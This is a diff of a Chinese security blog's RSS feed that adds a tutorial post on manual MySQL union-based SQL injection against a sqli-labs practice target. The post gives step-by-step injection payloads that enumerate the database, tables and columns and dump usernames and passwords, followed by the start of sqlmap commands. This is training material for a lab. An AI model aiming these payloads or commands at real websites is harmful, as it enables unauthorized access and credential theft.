@@ -7,7 +7,289 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Retr0</copyright>
-        <lastBuildDate>Wed, 26 Nov 2025 23:11:40 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/categories/%E7%BD%91%E5%AE%89/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Fri, 28 Nov 2025 20:07:03 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/categories/%E7%BD%91%E5%AE%89/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>1.5 mysql注入初步</title>
+        <link>https://www.retr0.xyz/p/1.5-mysql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%AD%A5/</link>
+        <pubDate>Fri, 28 Nov 2025 20:07:03 +0800</pubDate>
+        
+        <guid>https://www.retr0.xyz/p/1.5-mysql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%AD%A5/</guid>
+        <description>&lt;h2 id=&#34;手动注入&#34;&gt;手动注入
+&lt;/h2&gt;&lt;p&gt;以靶场&lt;a class=&#34;link&#34; href=&#34;http://sqlilabs.njhack.xyz/Less-1/index.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://sqlilabs.njhack.xyz/Less-1/index.php&lt;/a&gt;为例&lt;/p&gt;
+&lt;h3 id=&#34;step1破坏数据库语句&#34;&gt;Step1：破坏数据库语句
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;破坏数据库语句的目的就是让数据库报错，通过报错信息猜测查询语句的写法&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;数据库传入参数的几种闭合方式：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#39;&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;((&amp;#39;&amp;#39;))
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(&amp;#34;&amp;#34;)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;((&amp;#34;&amp;#34;))
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(())
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;没有闭合方式
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;补充1：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;\&lt;/code&gt;称为转义字符，可以把自己后面的第一个东西当作字符串去执行&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;我们传入以下参数：&lt;code&gt;2\&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;有如下报错：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://free.picui.cn/free/2025/11/28/69298f0c3f5d4.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;我们选取其中核心部分&lt;code&gt;&#39;&#39;2\&#39; LIMIT 0,1&#39;&lt;/code&gt;去掉头尾&lt;font style=&#34;color:#DF2A3F;&#34;&gt;（因为头尾用来闭合的符号是php报错语句携带的，不是真实代码）&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;LIMIT&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;由此得知该数据库的查询语句是单引号&lt;code&gt;&#39;&#39;&lt;/code&gt;闭合&lt;/p&gt;
+&lt;p&gt;因此大概估计查询语句可能为&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;tablex&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;$id&amp;#39;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:#DF2A3F;&#34;&gt;解释：&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:#DF2A3F;&#34;&gt;此处&lt;/font&gt;&lt;code&gt;limit a,b&lt;/code&gt;&lt;font style=&#34;color:#DF2A3F;&#34;&gt;语法指从数据表的第a条起选取b条数据&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:#DF2A3F;&#34;&gt;数据表条目要从第0个开始数&lt;/font&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;补充2：&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;数据库的注释符：&lt;code&gt;--&lt;/code&gt;、&lt;code&gt;/**/&lt;/code&gt;、&lt;code&gt;#&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;+&lt;/code&gt;在GET请求里相当于空格&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;code&gt;+&lt;/code&gt;一般配合&lt;code&gt;--&lt;/code&gt;作为GET请求的注释符使用&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;接下来我们传入参数&lt;code&gt;id=2&#39; --+&lt;/code&gt;，那么拼成的语句是：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;tablex&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--+&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;由于&lt;code&gt;--&lt;/code&gt;把后面的内容都注释掉了，实际上执行的数据库语句应该是：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;tablex&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;提交参数发现查询正常（如图），说明它真的是用&lt;code&gt;&#39;&#39;&lt;/code&gt;进行闭合的&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://free.picui.cn/free/2025/11/28/69298f0c43d19.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;step2确定查询了多少个栏目&#34;&gt;Step2：确定查询了多少个栏目
+&lt;/h3&gt;&lt;p&gt;从现在开始我们要调用各种语法查询数据，&lt;font style=&#34;color:#DF2A3F;&#34;&gt;记住之后的语法全部都是插入在&lt;/font&gt;&lt;code&gt;2&#39; {} --+&lt;/code&gt;&lt;font style=&#34;color:#DF2A3F;&#34;&gt;中的花括号位置！&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;因为之前的语句中username,password栏目是猜测的，所以接下来要核实究竟有多少个栏目&lt;/p&gt;
+&lt;p&gt;传入参数&lt;code&gt;2&#39; order by [数字] --+&lt;/code&gt;使用二分法查看&lt;/p&gt;
+&lt;p&gt;依次传参，其中数字填为10、5、3&amp;hellip;&amp;hellip;&lt;/p&gt;
+&lt;p&gt;当数字最大为&lt;strong&gt;3&lt;/strong&gt;时有结果，改为&lt;strong&gt;4&lt;/strong&gt;时没有结果&lt;/p&gt;
+&lt;p&gt;因此确定查询出了&lt;strong&gt;3&lt;/strong&gt;个栏目，之前的猜测错误&lt;/p&gt;
+&lt;p&gt;修正：可能的查询项目是&lt;code&gt;id,username,password&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;step3显示报错位&#34;&gt;Step3：显示报错位
+&lt;/h3&gt;&lt;p&gt;传入参数&lt;code&gt;2&#39; union select 1,2,3  --+&lt;/code&gt;返回结果&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://free.picui.cn/free/2025/11/28/69298f0c8d1b4.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;但是我们想要让查询的1,2,3显示出来，所以要故意让&lt;code&gt;union&lt;/code&gt;之前的查询语句出错掩盖掉正常数据&lt;/p&gt;
+&lt;p&gt;传入参数&lt;code&gt;-2&#39; union select 1,2,3  --+&lt;/code&gt;返回结果&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://free.picui.cn/free/2025/11/28/69298f0c7a6ae.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;说明2、3号位是报错位（显示位）&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;补充3：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;union select a,b,c&lt;/code&gt;语法为&lt;strong&gt;联合查询&lt;/strong&gt;，方便我们将两条查询语句捆绑起来一起执行，&lt;font style=&#34;color:#DF2A3F;&#34;&gt;而且即便其中一条查询语句报错也不影响另一条查询语句输出结果&lt;/font&gt;，本地演示效果如下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://free.picui.cn/free/2025/11/28/69298f0c781ab.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;第二条select查询的1,2,3正好与前面查询的3个项目一一对应显示，&lt;strong&gt;&lt;font style=&#34;color:#DF2A3F;&#34;&gt;因此第二条select内容务必参照Step2中获得的查询栏目数填写！&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;step4查看数据库的库名&#34;&gt;Step4：查看数据库的库名
+&lt;/h3&gt;&lt;p&gt;使用语法&lt;code&gt;database()&lt;/code&gt;替换任意报错位&lt;/p&gt;
+&lt;p&gt;传入参数&lt;code&gt;-2&#39; union select 1,database(),3  --+&lt;/code&gt;返回结果:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://free.picui.cn/free/2025/11/28/69298f1fca874.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;此时2号位对应显示的就是数据库的库名：security&lt;/p&gt;
+&lt;h3 id=&#34;step5根据库名查看表名&#34;&gt;Step5：根据库名查看表名
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;补充4：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;数据库中一般有一个库名为&lt;code&gt;information_schema&lt;/code&gt;其中有名为&lt;code&gt;TABLES&lt;/code&gt;的数据表，里面统计了各个数据库名及其对应包含的表名，其中数据库名所在的列（栏目）为&lt;code&gt;TABLE_SCHNEMA&lt;/code&gt;，数据表名所在的列（栏目）为&lt;code&gt;TABLE_NAME&lt;/code&gt;，如图&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://free.picui.cn/free/2025/11/28/69298f2017a19.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;所以我们要编辑一下第二条查询语句让他能查询到&lt;code&gt;information_schema&lt;/code&gt;库中&lt;code&gt;TABLES&lt;/code&gt;表中的&lt;code&gt;TABLE_NAME&lt;/code&gt;栏目，并且要限制条件TABLE_SCHEMA=&amp;lsquo;security&amp;rsquo;，整合一下需求：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select 1,TABLE_NAME,3 from information_schema.TABLES where TABLE_SCHEMA=&amp;#39;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;--+&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;为了方便一个个查询符合的数据（一个个查看security库中的表名）我们可以在第二条语句后面补充&lt;code&gt;limit 0,1&lt;/code&gt;，之后依次修改前一个数字为1、2、3、4&amp;hellip;&amp;hellip;即可，也就是：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select 1,TABLE_NAME,3 from information_schema.TABLES where TABLE_SCHEMA=&amp;#39;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--+&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;传入参数后发现有4张表：&lt;code&gt;emails  referers  uagents  users&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;显然&lt;code&gt;users&lt;/code&gt;这个表对我们应该更有用&lt;/p&gt;
+&lt;h3 id=&#34;step6查询所需表的列栏目名&#34;&gt;Step6：查询所需表的列（栏目）名
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;补充5：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;information_schema&lt;/code&gt;这个库中还有一个名为&lt;code&gt;COLUMNS&lt;/code&gt;的表，里面记录了某个数据库（TABLE_SCHEMA）当中每个表（&lt;code&gt;TABLE_NAME&lt;/code&gt;）里包含的栏目(&lt;code&gt;COLUMN_NAME&lt;/code&gt;)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://free.picui.cn/free/2025/11/28/69298f1fe187f.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;所以我们现在的需求就是去&lt;code&gt;information_schema.COLUMNS&lt;/code&gt;表中查找&lt;code&gt;COLUMN_NAME&lt;/code&gt;栏目来看看security里users这个表有哪些栏目，并且添加限定条件&lt;code&gt;TABLE_SCHEMA=&#39;security&#39; and TABLE_NAME=&#39;users&#39;&lt;/code&gt;整合需求得到以下参数&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select 1,COLUMN_NAME,3 from information_schema.COLUMNS where TABLE_SCHEMA=&amp;#39;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and TABLE_NAME=&amp;#39;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--+&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;依次修改limit的值发现有这三个栏目：&lt;code&gt;id  username password&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;step7全部取出username及对应password&#34;&gt;Step7：全部取出username及对应password
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;补充6：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;使用&lt;code&gt;group_concat(栏目名)&lt;/code&gt;可以取出对应栏目的所有数据&lt;/p&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;方法一group_concat语法&#34;&gt;方法一：group_concat()语法
+&lt;/h4&gt;&lt;p&gt;传入以下参数：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;users&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--+&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;返回结果：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://free.picui.cn/free/2025/11/28/69298f2006d9c.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;注：此方法在之前需要使用&lt;code&gt;limit&lt;/code&gt;语法的地方也可尝试&lt;/p&gt;
+&lt;h4 id=&#34;方法二limit-ab-语法&#34;&gt;方法二：limit a,b 语法
+&lt;/h4&gt;&lt;p&gt;适用情况：网站有输出长度限制&lt;/p&gt;
+&lt;p&gt;与之前相同，在参数后面添加&lt;code&gt;limit 0,1&lt;/code&gt;手动修改依次输出&lt;/p&gt;
+&lt;h2 id=&#34;工具辅助注入&#34;&gt;工具辅助注入
+&lt;/h2&gt;&lt;h3 id=&#34;sqlmap-用法使用kali版本&#34;&gt;sqlmap 用法（使用Kali版本）
+&lt;/h3&gt;&lt;p&gt;慢速通用版：&lt;/p&gt;
+&lt;p&gt;STEP1:&lt;code&gt;sqlmap -u [目标url] --dbs&lt;/code&gt;也可使用&lt;code&gt;sqlmap -u [目标url] --current-db&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;前者获取目标网站的所有库名，后者获取当前数据库名&lt;/p&gt;
+&lt;p&gt;STEP2:&lt;code&gt;sqlmap -u [目标url] -D [库名] --tables&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;获取指定库里的表&lt;/p&gt;
+&lt;p&gt;STEP3:&lt;code&gt;sqlmap -u [目标url] -D [库名] -T [表名] --columns&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;获取指定表里的栏目&lt;/p&gt;
